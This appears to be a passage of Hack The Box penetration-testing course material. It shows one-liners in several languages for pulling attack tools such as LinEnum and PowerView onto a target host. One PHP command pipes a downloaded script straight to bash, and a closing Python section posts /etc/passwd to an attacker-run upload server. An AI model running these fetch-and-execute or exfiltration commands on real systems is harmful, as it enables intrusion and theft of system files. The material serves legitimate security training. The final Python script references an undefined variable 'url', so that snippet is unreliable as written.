## Python

#### Python 2 - Download

```Shell
3kjS@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
#### Python 3 - Download

```Shell
3kjS@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
## PHP

#### PHP Download with File_get_contents()

```Shell
3kjS@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
#### PHP Download with Fopen()

```Shell
3kjS@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
#### PHP Download a File and Pipe it to Bash

```Shell
3kjS@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
## Other Languages
#### Ruby - Download a File

```Shell
3kjS@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
#### Perl - Download a File

```Shell
3kjS@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
## JavaScript

We'll create a file called `wget.js` and save the following content:

```Javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false); WinHttpReq.Send(); BinStream = new ActiveXObject("ADODB.Stream"); BinStream.Type = 1; BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody); BinStream.SaveToFile(WScript.Arguments(1));
```
#### Download a File Using JavaScript and cscript.exe

```Shell
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
## VBScript

We'll create a file called `wget.vbs` and save the following content:

```VBScript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") dim bStrm: Set bStrm = createobject("Adodb.Stream") xHttp.Open "GET", WScript.Arguments.Item(0), False xHttp.Send with bStrm .type = 1 .open .write xHttp.responseBody .savetofile WScript.Arguments.Item(1), 2 end with
```
#### Download a File Using VBScript and cscript.exe

```Shell
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```
## Upload Operations using Python3
#### Starting the Python uploadserver Module

```Shell
3kjS@htb[/htb]$ python3 -m uploadserver
```
#### Uploading a File Using a Python One-liner

```Shell
3kjS@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

```Python
# To use the requests function, we need to import the module first. 
import requests 
# Define the target URL where we will upload the file. 
URL = "http://192.168.49.128:8000/upload" 
# Define the file we want to read, open it and save it in a variable. 
file = open("/etc/passwd","rb") 
# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```

